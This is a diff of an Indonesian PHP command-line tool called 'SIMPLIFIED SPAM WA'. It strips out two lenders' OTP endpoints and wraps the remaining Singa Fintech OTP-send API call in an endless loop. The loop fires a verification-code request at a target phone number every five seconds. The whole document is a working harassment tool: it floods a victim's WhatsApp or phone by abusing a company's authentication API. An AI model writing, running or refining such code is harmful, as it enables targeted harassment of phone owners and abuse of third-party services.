@@ -1,8 +1,6 @@
 <?php
 
 // ================== FUNGSI PENDUKUNG ==================
-
-#WARNA (Diambil dari implementasi penuh di spam.php)
 function color($color = "default" , $text  = null)
 {
     $arrayColor = array(
@@ -50,20 +48,18 @@ function acak($length = 3) {
     return $randomString;
 }
 
-
 // ================== LOGIKA UTAMA ==================
 
 lagi:
 clear();
 
-// Tampilan Header Sederhana (Menggantikan ASCII art yang panjang)
+// Tampilan Header Sederhana
 echo color("red","================================\n");
-echo color("green"," [ SIMPLIFIED SPAM WA ]\n");
+echo color("green"," [ SIMPLIFIED SPAM WA - LOOP ]\n");
 echo color("red","================================\n\n");
 
-
 // Opsi Menu yang Disederhanakan
-echo color("green"," 1: Whatsapp\n");
+echo color("green"," 1: Mulai Spam Whatsapp\n");
 echo color("red"," 2: Fitur Dihapus (Pesan Manual)\n");
 echo color("red"," 3: Fitur Dihapus (Support Admin)\n\n");
 echo color("green"," Pilih : ");
@@ -77,11 +73,10 @@ if ($aaa1 == 1) {
     goto lagi;
 }
 
-
 whatsapp:
 clear();
 echo color("green","\n\n\𝐌𝐀𝐒𝐔𝐊𝐈𝐍 𝐍𝐎𝐓𝐀𝐑𝐆𝐄𝐓 (Using 08) : ");
-$nomor = trim(fgets(STDIN)); // Ambil input nomor
+$nomor = trim(fgets(STDIN)); 
 
 if ($nomor == '-') {
   echo color("red"," Maksud lu apa mau nge spam gw?\n");
@@ -89,68 +84,40 @@ if ($nomor == '-') {
   goto lagi;
 }
 
-// ================== SINGA FINTECH ==================
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://api.singafintech.com/otp/send',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type: application/json'
-  ),
-));
-$response = curl_exec($curl);
-$result = fetch_value($response,'"success":',',');
-if ($result == 'true') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-} else {
-  echo " SINGA FINTECH ".$response."\n";
-}
+$count = 1;
 
-// ================== ADIRA FINANCE ==================
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type:  application/json; charset=utf-8'
-  ),
-));
-$response = curl_exec($curl);
-$result = fetch_value($response,'{"message":"','","');
-if ($result == 'success') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-} else {
-  echo " ADIRAKU ".$response."\n";
-}
+// Loop untuk mengirim kode terus menerus
+while (true) {
+    echo color("yellow","\n======================================================\n");
+    echo color("yellow","[ATTEMPT #".$count."] Mengirim ke ".$nomor."\n");
+    echo color("yellow","======================================================\n");
 
-// ================== SPEEDCASH ==================
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://api.speedcash.co.id/otp/request',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type: application/json'
-  ),
-));
-$response = curl_exec($curl);
-$result = fetch_value($response,'"success":',',');
-if ($result == 'true') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-} else {
-  echo " SPEEDCASH ".$response."\n";
-}
+    // ================== 🟢 SINGA FINTECH (WORKING) ==================
+    $curl = curl_init();
+    curl_setopt_array($curl, array(
+      CURLOPT_URL => 'https://api.singafintech.com/otp/send',
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_TIMEOUT => 10,
+      CURLOPT_CUSTOMREQUEST => 'POST',
+      CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
+      CURLOPT_HTTPHEADER => array(
+        'Content-Type: application/json'
+      ),
+    ));
+    $response = curl_exec($curl);
+    $result = fetch_value($response,'"success":',',');
+    
+    // Check for success or specific errors
+    if ($result === 'true') {
+      echo color("green"," ".acak(3)." Spam Whatsapp Berhasil Ke ".$nomor."\n");
+    } else {
+      echo color("red"," SINGA FINTECH GAGAL: ".$response."\n");
+    }
 
-echo color("yellow"," Done Sensei..\n");
-sleep(3);
-goto lagi;
+    // Delay 5 detik sebelum upaya berikutnya
+    echo color("nevy","\n Mengirim ulang dalam 5 detik... (Tekan CTRL+C untuk berhenti)\n");
+    sleep(5); 
+    $count++;
+}
 
 ?>
